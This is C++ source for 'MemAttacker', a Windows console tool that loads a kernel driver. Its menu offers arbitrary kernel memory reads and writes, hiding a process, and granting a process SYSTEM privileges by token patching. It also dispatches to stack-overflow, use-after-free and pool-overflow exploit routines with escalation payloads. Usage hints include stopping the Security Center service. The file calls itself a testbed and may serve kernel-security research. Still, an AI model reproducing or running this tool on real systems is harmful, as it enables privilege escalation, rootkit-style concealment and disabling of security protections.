
#include "windows.h"
#include "stdio.h"
#include "wchar.h"
#include <tchar.h>
#include <locale.h> // LC_ALL

#include <iostream>
#include <string>

#include "mem_attacker_console.h" // class MemAttacker
#include "..\shared\mem_attacker_shared.h" // MEM_ATTACKER_SYS_FILE, MEM_ATTACKER_SERVNAME_APP, MEM_ATTACKER_LINKNAME_APP
#include "resource.h" // MEM_ATTACKER_RESOURCE 

using namespace std;

const int command_wrong = 0x12345678;

const char name_read_1_byte[] = "read1";
const int command_read_1_byte = 0x1001;

const char name_write_1_byte[] = "write1";
const int command_write_1_byte = 0x2001;

const char name_write_8_bytes[] = "write8";
const int command_write_8_bytes = 0x2008;

const char name_hide_proc[] = "hide";
const int command_hide_proc = 0x111DE;

const char name_priv_proc[] = "priv";
const int command_priv_proc = 0x1115E;

const char name_test_stack[] = "test_stack";
const int command_test_stack = 110;

const char name_stack[] = "stack";
const int command_stack = 111;

const char name_test_uaf[] = "test_uaf";
const int command_test_uaf = 120;

const char name_uaf[] = "uaf";
const int command_uaf = 121;

const char name_test_pool[] = "test_pool";
const int command_test_pool = 131;

const char name_pool[] = "pool";
const int command_pool = 132;


const char name_exit[] = "exit";
const int command_exit = 0xFFF1;

const char name_quit[] = "q";
const int command_quit = 0xFFF2;

void print_hello() {
	cout << endl;
	cout << "<< [ MemAttacker accesses kernel-mode memory illegaly ] >>" << endl;
	cout << " '" << name_read_1_byte   << " <Address>  ' -- read 1 byte from memory <Address>" << endl;
	cout << " '" << name_write_1_byte  << " <Address>  <Value in hex>' -- write 1 byte to memory <Address>" << endl;
	cout << " '" << name_write_8_bytes << " <Address>  <Value in hex>' -- write 8 bytes to memory <Address>" << endl;
	cout << " '" << name_hide_proc << " <UniqueProcessId in dec> ' --  hide process with <UniqueProcessId>" << endl;
	cout << " '" << name_priv_proc << " <UniqueProcessId in dec> ' --  set NT AUTHORITY\\SYSTEM privileges for <UniqueProcessId> via patching" << endl;
//	std::cout << " '" << name_test_stack << " <BufferSize>' -- test stack overflow with <BufferSize>" << endl;
//*	std::cout << " '" << name_stack << " <UniqueProcessId in dec>' -- set NT AUTHORITY\\SYSTEM privileges for <UniqueProcessId> via stack overflow [SMEP BSOD issue] " << endl;
//	std::cout << " '" << name_test_uaf << "' -- run simple use after free, which cause a BSOD " << endl;
//*	std::cout << " '" << name_uaf << " <UniqueProcessId in dec>' -- set NT AUTHORITY\\SYSTEM privileges for <UniqueProcessId> via use after free [SMEP BSOD issue]" << endl;
//	std::cout << " '" << name_test_pool << "' -- test pool functions" << endl;
//	std::cout << " '" << name_pool << " <BufferSize>' -- test pool overflow with <BufferSize>" << endl;

	cout << endl;
	cout << "    to test run 'cmd.exe'" << endl;
	cout << "    to get <UniqueProcessId> run 'tasklist | findstr cmd*' " << endl;
	cout << "    to read privileges run 'whoami' " << endl;
	cout << "    to check privileges run 'sc stop wscsvc' " << endl;	
	
	
	cout << endl;
	cout << " '" << name_exit << "' -- exit this app " << endl;

}

int read_parse() {

	string string_command = { 0 };
	string_command = { 0 };
	cin >> string_command; // std::getline(std::cin >> std::ws, mystring);

	int i_res = command_wrong;

	if (std::string::npos != string_command.find(name_read_1_byte)) {
		i_res = command_read_1_byte;
	}
	if (std::string::npos != string_command.find(name_write_1_byte)){
		i_res = command_write_1_byte;
	}
	if (std::string::npos != string_command.find(name_write_8_bytes)) {
		i_res = command_write_8_bytes;
	}

	if (std::string::npos != string_command.find(name_hide_proc)) {
		i_res = command_hide_proc;
	}
	if (std::string::npos != string_command.find(name_priv_proc)) {
		i_res = command_priv_proc;
	}
	else if (std::string::npos != string_command.find(name_test_stack)) {
		i_res = command_test_stack;
	}
	else if (std::string::npos != string_command.find(name_stack)) {
		i_res = command_stack;
	}
	else if (std::string::npos != string_command.find(name_test_uaf)) {
		i_res = command_test_uaf;
	}
	else if (std::string::npos != string_command.find(name_uaf)) {
		i_res = command_uaf;
	}
	else if (std::string::npos != string_command.find(name_test_pool)) {
		i_res = command_test_pool;
	}
	else if (std::string::npos != string_command.find(name_pool)) {
		i_res = command_pool;
	}

	else if (std::string::npos != string_command.find(name_quit)) {
		i_res = command_quit;
	}
	else if (std::string::npos != string_command.find(name_exit)) {
		i_res = command_exit;
	}
	return i_res;
}

int wmain(int argc, wchar_t *argv[], wchar_t *envp[])
{
	argc; argv; envp; // to avoid warning C4100
	setlocale(LC_ALL, "");
	setvbuf(stdout, NULL, _IONBF, 0);

//	if (check_windows_support::is_ok()) 
	{
		mem_attacker_console :: MemAttacker my_testbed; // activate testbed
		if (my_testbed.is_ok(MEM_ATTACKER_RESOURCE, MEM_ATTACKER_SYS_FILE, MEM_ATTACKER_SERVNAME_APP, MEM_ATTACKER_LINKNAME_APP))
		{
			int code_command = 0;
			ULONG64 address = 0;
			int16_t value1byte = 0;
			ULONG64 value8bytes = 0;
			ULONG64 proc_id = 0;
			int bufsz = 0;
			int target_pid = 0;
			do {
				print_hello();
				code_command = read_parse();
				switch (code_command)
				{
				case command_read_1_byte:
					address = 0; cin >> std::hex >> address;
					my_testbed.read_1byte(address);
					break;
				case command_write_1_byte:
					address = 0; cin >> std::hex >> address;
					value1byte = 0; cin >> std::hex >> value1byte;
					my_testbed.write_1byte(address, (char)value1byte);
					break;
				case command_write_8_bytes:
					address = 0; cin >> std::hex >> address;
					value8bytes = 0; cin >> std::hex >> value8bytes;
					my_testbed.write_8bytes(address, value8bytes);
					break;
				case command_hide_proc:
					proc_id = 0; cin >> std::dec >> proc_id;
					my_testbed.hide_proc(proc_id);
					break;
				case command_priv_proc:
					proc_id = 0; cin >> std::dec >> proc_id;
					my_testbed.set_priv(proc_id);
					break;
				case command_test_stack:
					bufsz = 0; std::cin >> std::dec >> bufsz;
					my_testbed.run_simple_stack_overflow(bufsz);
					break;
				case command_stack:
					target_pid = 0; std::cin >> std::dec >> target_pid;
					my_testbed.run_stack_overflow_with_payload(target_pid);
					break;
				case command_test_uaf:
					my_testbed.run_use_after_free();
					break;
				case command_uaf:
					target_pid = 0; std::cin >> std::dec >> target_pid;
					my_testbed.run_use_after_free_with_payload(target_pid);
					break;
				case command_test_pool:
					my_testbed.test_pool_allocations();
					break;
				case command_pool:
					bufsz = 0; std::cin >> std::dec >> bufsz;
					my_testbed.run_pool_overflow(bufsz);
					break;
				case command_wrong:
					std::cout << " ---wrong command, try again---" << endl;
					break;
				default: { };
				}
				cin.clear();
				cin.ignore(10000, '\n');
			} while (!((code_command == command_quit) || (code_command == command_exit)) );
		}
	}
	cin.ignore();
	cout << "Press enter to exit." << endl;
	cin.ignore(); // std::system("PAUSE");
}